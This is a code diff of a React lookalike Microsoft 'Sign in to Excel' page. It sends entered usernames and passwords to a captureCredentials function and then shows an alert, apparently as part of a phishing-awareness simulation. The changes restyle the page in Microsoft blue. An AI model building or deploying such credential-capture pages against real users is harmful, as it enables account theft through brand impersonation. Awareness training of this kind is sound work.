@@ -35,8 +35,9 @@ export default function SharePointLoginPage() {
       await captureCredentials({ username, password });
       setShowAlert(true);
     } catch (error) {
-      console.error('Error capturing credentials:', error);
-      setShowAlert(true); // Show alert for awareness, even if the server call fails.
+      // The client-side logic is designed to show the alert regardless of success or failure.
+      console.error('Error in handleSubmit:', error);
+      setShowAlert(true);
     }
   };
 
@@ -67,7 +68,7 @@ export default function SharePointLoginPage() {
               priority
             />
           </div>
-          <CardTitle className="text-2xl text-[#217346] font-semibold">
+          <CardTitle className="text-2xl text-white font-semibold">
             Sign in to Excel
           </CardTitle>
         </CardHeader>
@@ -96,7 +97,7 @@ export default function SharePointLoginPage() {
 
             <Button
               type="submit"
-              className="w-full p-3 mt-2 bg-[#217346] text-white font-bold rounded-md hover:bg-green-800 transition-colors"
+              className="w-full p-3 mt-2 bg-[#0078D4] text-white font-bold rounded-md hover:bg-blue-700 transition-colors"
             >
               Sign in
             </Button>
